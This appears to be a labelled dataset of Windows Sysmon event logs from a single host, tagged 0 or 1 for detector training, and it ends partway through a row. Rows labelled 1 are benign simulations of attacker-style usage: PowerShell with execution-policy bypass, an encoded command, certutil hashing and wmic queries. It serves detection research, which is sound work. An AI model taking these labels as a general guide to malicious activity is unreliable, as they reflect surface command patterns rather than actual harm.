"Process Create: RuleName: - UtcTime: 2025-11-27 17:46:39.865 ProcessGuid: {3a35410f-8e7f-6928-0b08-000000000b00} ProcessId: 14924 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe FileVersion: 10.0.19041.3996 (WinBuild.160101.0800) Description: Windows PowerShell Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: PowerShell.EXE CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -Command ""Write-Output 'Test 36'"" CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6 ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
Registry value set: RuleName: T1122 EventType: SetValue UtcTime: 2025-11-27 17:19:56.016 ProcessGuid: {3a35410f-883b-6928-bf06-000000000b00} ProcessId: 3732 Image: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\OneDrive.exe TargetObject: HKU\S-1-5-21-3351607045-2108423416-1727308141-1001_Classes\CLSID\{F241C880-6982-4CE5-8CF7-7085BA96DA5A}\InprocServer32\(Default) Details: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\25.209.1026.0002\FileSyncShell64.dll User: DESKTOP-EJG8QJC\Emil Jinu,0
Network connection detected: RuleName: - UtcTime: 2025-11-27 18:03:18.684 ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00} ProcessId: 15028 Image: C:\Windows\System32\wbem\WMIC.exe User: DESKTOP-EJG8QJC\Emil Jinu Protocol: udp Initiated: true SourceIsIpv6: false SourceIp: 10.0.2.15 SourceHostname: DESKTOP-EJG8QJC SourcePort: 57443 SourcePortName: - DestinationIsIpv6: false DestinationIp: 1.1.1.1 DestinationHostname: one.one.one.one DestinationPort: 53 DestinationPortName: domain,1
File created: RuleName: DLL UtcTime: 2025-11-27 14:57:36.921 ProcessGuid: {3a35410f-656d-6928-5500-000000000b00} ProcessId: 720 Image: C:\Windows\system32\svchost.exe TargetFilename: C:\Program Files\WindowsApps\Microsoft.Windows.DevHome_0.2100.858.0_x64__8wekyb3d8bbwe\WindowsAdvancedSettingsStub\hu-HU\WindowsAdvancedSettings.resources.dll CreationUtcTime: 2025-11-27 14:57:36.921 User: NT AUTHORITY\SYSTEM,0
"Process Create: RuleName: - UtcTime: 2025-11-27 17:32:13.245 ProcessGuid: {3a35410f-8b1d-6928-c107-000000000b00} ProcessId: 5100 Image: C:\Program Files (x86)\Microsoft\Edge\Application\142.0.3595.94\identity_helper.exe FileVersion: 142.0.3595.94 Description: PWA Identity Proxy Host Product: Microsoft Edge Company: Microsoft Corporation OriginalFileName: identity_helper.exe CommandLine: ""C:\Program Files (x86)\Microsoft\Edge\Application\142.0.3595.94\identity_helper.exe"" --type=utility --utility-sub-type=winrt_app_id.mojom.WinrtAppIdService --lang=en-US --service-sandbox-type=none --ram-no-pressure-read-main-dll --metrics-shmem-handle=4504,i,4852692379200493935,11636400312931788493,524288 --field-trial-handle=2280,i,13217757045165639365,3489437783660714940,262144 --variations-seed-version --trace-process-track-uuid=3190708990997080739 --mojo-platform-channel-handle=4524 /prefetch:8 CurrentDirectory: C:\Program Files (x86)\Microsoft\Edge\Application\142.0.3595.94\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-c9e6-200000000000} LogonId: 0x20E6C9 TerminalSessionId: 1 IntegrityLevel: Medium Hashes: MD5=B836E283A8198A39CBEBEE345851829A,SHA256=280E36D70C3EC664C202B9BF2A8415B38D1EFBCD57926EA0A7B5A9D103936FFE,IMPHASH=55C92788DC86824DCF85360071E9FCAC ParentProcessGuid: {3a35410f-8b1c-6928-bb07-000000000b00} ParentProcessId: 7464 ParentImage: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe ParentCommandLine: ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --no-startup-window ParentUser: DESKTOP-EJG8QJC\Emil Jinu",0
"Process Create: RuleName: - UtcTime: 2025-11-27 18:03:30.970 ProcessGuid: {3a35410f-9272-6928-9610-000000000b00} ProcessId: 8656 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe FileVersion: 10.0.19041.3996 (WinBuild.160101.0800) Description: Windows PowerShell Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: PowerShell.EXE CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoProfile -ExecutionPolicy Bypass -Command Write-Output 'PS 183'; Start-Sleep -Seconds 1 CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6 ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
File created: RuleName: - UtcTime: 2025-11-27 18:00:45.790 ProcessGuid: {3a35410f-91ca-6928-9a0d-000000000b00} ProcessId: 3080 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe TargetFilename: C:\Users\Emil Jinu\AppData\Local\Temp\__PSScriptPolicyTest_sdxz25fp.2hr.ps1 CreationUtcTime: 2025-11-27 18:00:45.790 User: DESKTOP-EJG8QJC\Emil Jinu,1
Registry value set: RuleName: T1122 EventType: SetValue UtcTime: 2025-11-27 17:19:43.910 ProcessGuid: {3a35410f-882f-6928-aa06-000000000b00} ProcessId: 6864 Image: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\OneDrive.exe TargetObject: HKU\S-1-5-21-3351607045-2108423416-1727308141-1001_Classes\CLSID\{1BF42E4C-4AF4-4CFD-A1A0-CF2960B8F63E}\InprocServer32\(Default) Details: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\25.209.1026.0002\FileSyncShell64.dll User: DESKTOP-EJG8QJC\Emil Jinu,0
Registry value set: RuleName: InvDB-CompileTimeClaim EventType: SetValue UtcTime: 2025-11-27 15:01:30.872 ProcessGuid: {3a35410f-656a-6928-3e00-000000000b00} ProcessId: 2740 Image: C:\Windows\System32\svchost.exe TargetObject: \REGISTRY\A\{9309e89c-9321-cf1a-3889-0090faa6586f}\Root\InventoryApplicationFile\locationnotifica|66c72d387a54cca\LinkDate Details: 05/22/1981 18:21:27 User: NT AUTHORITY\SYSTEM,0
Registry value set: RuleName: InvDB-Pub EventType: SetValue UtcTime: 2025-11-27 15:39:34.341 ProcessGuid: {3a35410f-656a-6928-3e00-000000000b00} ProcessId: 2740 Image: C:\Windows\System32\svchost.exe TargetObject: \REGISTRY\A\{9309e89c-9321-cf1a-3889-0090faa6586f}\Root\InventoryApplicationFile\mstsc.exe|5fe3c648659308d1\Publisher Details: microsoft corporation User: NT AUTHORITY\SYSTEM,0
"Process Create: RuleName: - UtcTime: 2025-11-27 17:56:56.940 ProcessGuid: {3a35410f-90e8-6928-d108-000000000b00} ProcessId: 1436 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe FileVersion: 10.0.19041.3996 (WinBuild.160101.0800) Description: Windows PowerShell Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: PowerShell.EXE CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAEUAMgAnAA== CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6 ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
Registry value set: RuleName: T1122 EventType: SetValue UtcTime: 2025-11-27 17:30:24.508 ProcessGuid: {3a35410f-8ab0-6928-6f07-000000000b00} ProcessId: 9116 Image: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\OneDrive.exe TargetObject: HKU\S-1-5-21-3351607045-2108423416-1727308141-1001_Classes\WOW6432Node\CLSID\{F241C880-6982-4CE5-8CF7-7085BA96DA5A}\InprocServer32\(Default) Details: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\25.209.1026.0002\i386\FileSyncShell.dll User: DESKTOP-EJG8QJC\Emil Jinu,0
Registry value set: RuleName: InvDB-Pub EventType: SetValue UtcTime: 2025-11-27 15:35:43.145 ProcessGuid: {3a35410f-656a-6928-3e00-000000000b00} ProcessId: 2740 Image: C:\Windows\System32\svchost.exe TargetObject: \REGISTRY\A\{9309e89c-9321-cf1a-3889-0090faa6586f}\Root\InventoryApplicationFile\setup_wm.exe|12f8cdcfd6452ba\Publisher Details: microsoft corporation User: NT AUTHORITY\SYSTEM,0
Registry value set: RuleName: InvDB-Ver EventType: SetValue UtcTime: 2025-11-27 15:29:07.052 ProcessGuid: {3a35410f-658e-6928-7600-000000000b00} ProcessId: 2560 Image: C:\Windows\system32\svchost.exe TargetObject: \REGISTRY\A\{9309e89c-9321-cf1a-3889-0090faa6586f}\Root\InventoryApplicationFile\olk.exe|c4e366a3b3f47d6\BinProductVersion Details: 1.2025.1007.400 User: NT AUTHORITY\SYSTEM,0
"Process Create: RuleName: - UtcTime: 2025-11-27 18:10:43.650 ProcessGuid: {3a35410f-9423-6928-d916-000000000b00} ProcessId: 1624 Image: C:\Windows\System32\certutil.exe FileVersion: 10.0.19041.5794 (WinBuild.160101.0800) Description: CertUtil.exe Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: CertUtil.exe CommandLine: ""C:\Windows\system32\certutil.exe"" -hashfile C:\Windows\win.ini SHA256 CurrentDirectory: C:\Users\Emil Jinu\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-c9e6-200000000000} LogonId: 0x20E6C9 TerminalSessionId: 1 IntegrityLevel: Medium Hashes: MD5=E6384AD54B07F9783135586C71F82D1C,SHA256=FD1670B43E2D9188B12B233780BF043C5A90A67A2C6E3FCDC564A5C246531BC2,IMPHASH=5AFC8346D5AFF4A4862E8A7C91042465 ParentProcessGuid: {3a35410f-93eb-6928-6715-000000000b00} ParentProcessId: 6344 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
File created: RuleName: - UtcTime: 2025-11-27 17:48:28.773 ProcessGuid: {3a35410f-8eec-6928-4708-000000000b00} ProcessId: 10024 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe TargetFilename: C:\Users\Emil Jinu\AppData\Local\Temp\__PSScriptPolicyTest_qvdnhg5m.tna.ps1 CreationUtcTime: 2025-11-27 17:48:28.773 User: DESKTOP-EJG8QJC\Emil Jinu,1
"Process Create: RuleName: - UtcTime: 2025-11-27 17:58:37.845 ProcessGuid: {3a35410f-914d-6928-510b-000000000b00} ProcessId: 6704 Image: C:\Windows\System32\cmd.exe FileVersion: 10.0.19041.4355 (WinBuild.160101.0800) Description: Windows Command Processor Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: Cmd.Exe CommandLine: ""C:\Windows\system32\cmd.exe"" /c echo proc 61 & timeout /t 1 >nul CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18 ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
File created: RuleName: - UtcTime: 2025-11-27 17:51:29.697 ProcessGuid: {3a35410f-8fa1-6928-a508-000000000b00} ProcessId: 14484 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe TargetFilename: C:\Users\Emil Jinu\AppData\Local\Temp\__PSScriptPolicyTest_2ubaplym.czh.ps1 CreationUtcTime: 2025-11-27 17:51:29.697 User: DESKTOP-EJG8QJC\Emil Jinu,1
"Process Create: RuleName: - UtcTime: 2025-11-27 18:01:00.686 ProcessGuid: {3a35410f-91dc-6928-010e-000000000b00} ProcessId: 9428 Image: C:\Windows\System32\wbem\WMIC.exe FileVersion: 10.0.19041.5794 (WinBuild.160101.0800) Description: WMI Commandline Utility Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: wmic.exe CommandLine: ""C:\Windows\System32\Wbem\WMIC.exe"" process list brief CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=EBE8CE528A79B5CC0782E8DFDA250600,SHA256=DA603FA720AB43AA6D4D36AA9FDB828DAB9645523EABAAC209AF6451D5B4D757,IMPHASH=527C7C66CDD13D72D793BCA3A417BCBE ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
Dns query: RuleName: - UtcTime: 2025-11-27 15:12:15.398 ProcessGuid: {3a35410f-6a07-6928-c402-000000000b00} ProcessId: 10600 QueryName: config.ads.vungle.com QueryStatus: 0 QueryResults: ::ffff:34.206.152.9;::ffff:3.219.165.53;::ffff:34.231.53.90;::ffff:54.161.118.87;::ffff:52.20.84.15;::ffff:34.237.212.7;::ffff:54.210.79.201;::ffff:54.208.122.223; Image: C:\Program Files\WindowsApps\Microsoft.MicrosoftSolitaireCollection_4.24.11040.0_x64__8wekyb3d8bbwe\Solitaire.exe User: DESKTOP-EJG8QJC\Emil Jinu,0
"Process Create: RuleName: - UtcTime: 2025-11-27 17:49:49.088 ProcessGuid: {3a35410f-8f3d-6928-7c08-000000000b00} ProcessId: 9004 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe FileVersion: 10.0.19041.3996 (WinBuild.160101.0800) Description: Windows PowerShell Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: PowerShell.EXE CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -Command ""Write-Output 'Test 148'"" CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6 ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
Network connection detected: RuleName: - UtcTime: 2025-11-27 18:03:31.093 ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00} ProcessId: 15028 Image: C:\Windows\System32\wbem\WMIC.exe User: DESKTOP-EJG8QJC\Emil Jinu Protocol: udp Initiated: true SourceIsIpv6: false SourceIp: 10.0.2.15 SourceHostname: DESKTOP-EJG8QJC SourcePort: 61334 SourcePortName: - DestinationIsIpv6: false DestinationIp: 1.0.0.1 DestinationHostname: one.one.one.one DestinationPort: 53 DestinationPortName: domain,1
Registry value set: RuleName: T1122 EventType: SetValue UtcTime: 2025-11-27 17:19:54.008 ProcessGuid: {3a35410f-8839-6928-b806-000000000b00} ProcessId: 10576 Image: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\OneDrive.exe TargetObject: HKU\S-1-5-21-3351607045-2108423416-1727308141-1001_Classes\CLSID\{A78ED123-AB77-406B-9962-2A5D9D2F7F30}\InprocServer32\(Default) Details: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\25.209.1026.0002\FileSyncShell64.dll User: DESKTOP-EJG8QJC\Emil Jinu,0
"Process Create: RuleName: - UtcTime: 2025-11-27 18:10:04.666 ProcessGuid: {3a35410f-93fc-6928-8315-000000000b00} ProcessId: 15504 Image: C:\Windows\System32\certutil.exe FileVersion: 10.0.19041.5794 (WinBuild.160101.0800) Description: CertUtil.exe Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: CertUtil.exe CommandLine: ""C:\Windows\system32\certutil.exe"" -hashfile C:\Windows\win.ini SHA256 CurrentDirectory: C:\Users\Emil Jinu\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-c9e6-200000000000} LogonId: 0x20E6C9 TerminalSessionId: 1 IntegrityLevel: Medium Hashes: MD5=E6384AD54B07F9783135586C71F82D1C,SHA256=FD1670B43E2D9188B12B233780BF043C5A90A67A2C6E3FCDC564A5C246531BC2,IMPHASH=5AFC8346D5AFF4A4862E8A7C91042465 ParentProcessGuid: {3a35410f-93eb-6928-6715-000000000b00} ParentProcessId: 6344 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
"Process Create: RuleName: - UtcTime: 2025-11-27 17:17:51.188 ProcessGuid: {3a35410f-87bf-6928-8c06-000000000b00} ProcessId: 9432 Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe FileVersion: 142.1.84.141 Description: Brave Browser Product: Brave Browser Company: Brave Software, Inc. OriginalFileName: brave.exe CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --type=utility --utility-sub-type=patch.mojom.FilePatcher --lang=en-US --service-sandbox-type=service --metrics-shmem-handle=5572,i,3953593621321021555,4070328893327295273,524288 --field-trial-handle=2180,i,14415661657746549739,14912213405061520595,262144 --variations-seed-version=main@69c2005032bb14f803911c3458ab063c42bfa450 --trace-process-track-uuid=3190708998493415531 --mojo-platform-channel-handle=6148 /prefetch:8 CurrentDirectory: C:\Program Files\BraveSoftware\Brave-Browser\Application\142.1.84.141\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-c9e6-200000000000} LogonId: 0x20E6C9 TerminalSessionId: 1 IntegrityLevel: Low Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E ParentProcessGuid: {3a35410f-87b9-6928-7a06-000000000b00} ParentProcessId: 5944 ParentImage: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe ParentCommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --single-argument C:\Users\Emil Jinu\Documents\jkjnj.pdf ParentUser: DESKTOP-EJG8QJC\Emil Jinu",0
"Process Create: RuleName: - UtcTime: 2025-11-27 18:10:07.696 ProcessGuid: {3a35410f-93ff-6928-be15-000000000b00} ProcessId: 17724 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe FileVersion: 10.0.19041.3996 (WinBuild.160101.0800) Description: Windows PowerShell Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: PowerShell.EXE CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoProfile -ExecutionPolicy Bypass -Command Write-Output 'PS 9'; Start-Sleep -Seconds 1 CurrentDirectory: C:\Users\Emil Jinu\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-c9e6-200000000000} LogonId: 0x20E6C9 TerminalSessionId: 1 IntegrityLevel: Medium Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6 ParentProcessGuid: {3a35410f-93eb-6928-6715-000000000b00} ParentProcessId: 6344 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
"Process Create: RuleName: - UtcTime: 2025-11-27 16:56:34.650 ProcessGuid: {3a35410f-82c2-6928-db05-000000000b00} ProcessId: 14700 Image: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe FileVersion: 142.0.3595.94 Description: Microsoft Edge Product: Microsoft Edge Company: Microsoft Corporation OriginalFileName: msedge.exe CommandLine: ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --source-shortcut=""C:\Users\Emil Jinu\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\Copilot.lnk"" --profile-directory=Default --app-id=khiogjgiicnghciboipemonlmgelhblf --app-url=https://copilot.microsoft.com/?dpwa=1 --app-launch-source=4 CurrentDirectory: C:\Program Files (x86)\Microsoft\Edge\Application\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-c9e6-200000000000} LogonId: 0x20E6C9 TerminalSessionId: 1 IntegrityLevel: Medium Hashes: MD5=CC88E8CBC96E0183F15A240EC2E6D7BB,SHA256=C089768E72071ACA205E6B77C0538F58A3896CE5B0F65BA9BD38CDAE263D8A03,IMPHASH=4C2A67DEB457B8BF9F317820EE11E05D ParentProcessGuid: {3a35410f-82c2-6928-da05-000000000b00} ParentProcessId: 9880 ParentImage: C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe ParentCommandLine: ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe"" --profile-directory=Default --app-id=khiogjgiicnghciboipemonlmgelhblf --app-url=https://copilot.microsoft.com/?dpwa=1 --app-launch-source=4 ParentUser: DESKTOP-EJG8QJC\Emil Jinu",0
File created: RuleName: - UtcTime: 2025-11-27 18:10:57.929 ProcessGuid: {3a35410f-942e-6928-3f17-000000000b00} ProcessId: 17816 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe TargetFilename: C:\Users\Emil Jinu\AppData\Local\Temp\__PSScriptPolicyTest_slfzb3og.4tf.ps1 CreationUtcTime: 2025-11-27 18:10:57.929 User: DESKTOP-EJG8QJC\Emil Jinu,1
Network connection detected: RuleName: - UtcTime: 2025-11-27 18:03:19.306 ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00} ProcessId: 15028 Image: C:\Windows\System32\wbem\WMIC.exe User: DESKTOP-EJG8QJC\Emil Jinu Protocol: tcp Initiated: true SourceIsIpv6: false SourceIp: 10.0.2.15 SourceHostname: DESKTOP-EJG8QJC SourcePort: 57055 SourcePortName: - DestinationIsIpv6: false DestinationIp: 172.64.41.3 DestinationHostname: - DestinationPort: 443 DestinationPortName: https,1
"Process Create: RuleName: - UtcTime: 2025-11-27 18:01:36.291 ProcessGuid: {3a35410f-9200-6928-9c0e-000000000b00} ProcessId: 9576 Image: C:\Windows\System32\timeout.exe FileVersion: 10.0.19041.1 (WinBuild.160101.0800) Description: timeout - pauses command processing Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: timeout.exe CommandLine: timeout /t 1 CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=100065E21CFBBDE57CBA2838921F84D6,SHA256=C8C350FAB1130644536DB6A84F605791367308B995079AD494D46A8C617C21D6,IMPHASH=0C91A5CE0FB26F4C5CE39E340F43873B ParentProcessGuid: {3a35410f-91fc-6928-8b0e-000000000b00} ParentProcessId: 9572 ParentImage: C:\Windows\System32\cmd.exe ParentCommandLine: ""C:\Windows\system32\cmd.exe"" /c echo proc 136 & timeout /t 1 >nul ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
Registry value set: RuleName: T1122 EventType: SetValue UtcTime: 2025-11-27 17:30:21.344 ProcessGuid: {3a35410f-8aac-6928-6c07-000000000b00} ProcessId: 13432 Image: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\OneDrive.exe TargetObject: HKU\S-1-5-21-3351607045-2108423416-1727308141-1001_Classes\CLSID\{5AB7172C-9C11-405C-8DD5-AF20F3606282}\InprocServer32\(Default) Details: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\25.209.1026.0002\FileSyncShell64.dll User: DESKTOP-EJG8QJC\Emil Jinu,0
File created: RuleName: - UtcTime: 2025-11-27 17:48:33.777 ProcessGuid: {3a35410f-8ef1-6928-4c08-000000000b00} ProcessId: 9080 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe TargetFilename: C:\Users\Emil Jinu\AppData\Local\Temp\__PSScriptPolicyTest_arlrly5b.4ke.ps1 CreationUtcTime: 2025-11-27 17:48:33.777 User: DESKTOP-EJG8QJC\Emil Jinu,1
"Process Create: RuleName: - UtcTime: 2025-11-27 18:00:42.824 ProcessGuid: {3a35410f-91ca-6928-9f0d-000000000b00} ProcessId: 14024 Image: C:\Windows\System32\certutil.exe FileVersion: 10.0.19041.5794 (WinBuild.160101.0800) Description: CertUtil.exe Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: CertUtil.exe CommandLine: ""C:\Windows\system32\certutil.exe"" -hashfile C:\Windows\win.ini SHA256 CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=E6384AD54B07F9783135586C71F82D1C,SHA256=FD1670B43E2D9188B12B233780BF043C5A90A67A2C6E3FCDC564A5C246531BC2,IMPHASH=5AFC8346D5AFF4A4862E8A7C91042465 ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
File created: RuleName: - UtcTime: 2025-11-27 17:48:15.969 ProcessGuid: {3a35410f-8edf-6928-3c08-000000000b00} ProcessId: 14536 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe TargetFilename: C:\Users\Emil Jinu\AppData\Local\Temp\__PSScriptPolicyTest_jgur5xuq.b5x.ps1 CreationUtcTime: 2025-11-27 17:48:15.969 User: DESKTOP-EJG8QJC\Emil Jinu,1
"Process Create: RuleName: - UtcTime: 2025-11-27 18:03:52.868 ProcessGuid: {3a35410f-9288-6928-3e11-000000000b00} ProcessId: 15284 Image: C:\Windows\System32\wbem\WMIC.exe FileVersion: 10.0.19041.5794 (WinBuild.160101.0800) Description: WMI Commandline Utility Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: wmic.exe CommandLine: ""C:\Windows\System32\Wbem\WMIC.exe"" os get Caption CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=EBE8CE528A79B5CC0782E8DFDA250600,SHA256=DA603FA720AB43AA6D4D36AA9FDB828DAB9645523EABAAC209AF6451D5B4D757,IMPHASH=527C7C66CDD13D72D793BCA3A417BCBE ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: 